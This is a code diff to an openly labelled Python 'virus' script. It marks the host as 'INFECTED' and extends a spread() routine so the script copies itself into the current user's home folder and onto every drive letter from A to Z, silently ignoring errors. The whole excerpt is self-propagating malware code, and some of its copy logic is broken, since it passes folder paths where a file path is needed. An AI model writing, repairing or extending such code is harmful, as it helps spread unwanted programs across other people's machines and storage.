@@ -7,19 +7,36 @@ import getpass
 status = 'INFECTED'
 
 
+drives = ['A:\\', 'B:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\',
+          'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\',
+          'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\',
+          'Z:\\']
+
+
 def spread():
     usr = getpass.getuser()
     new_path = 'C:/Users/' + usr
     name = sys.argv[0]
     path = os.getcwd()
     abspath = os.path.join(path, name)
+
     if os.path.isdir(new_path):
-        try:
-            shutil.copyfile(abspath, new_path)
-        except Exception:
+        if name not in new_path:
+            try:
+                shutil.copyfile(abspath, new_path)
+            except Exception:
+                pass
+        else:
             pass
-    else:
-        pass
+
+    for drive in drives:
+        if os.path.isdir(drive):
+            try:
+                shutil.copyfile(abspath, drive)
+            except Exception:
+                pass
+        else:
+            pass
 
 
 def virus_property():
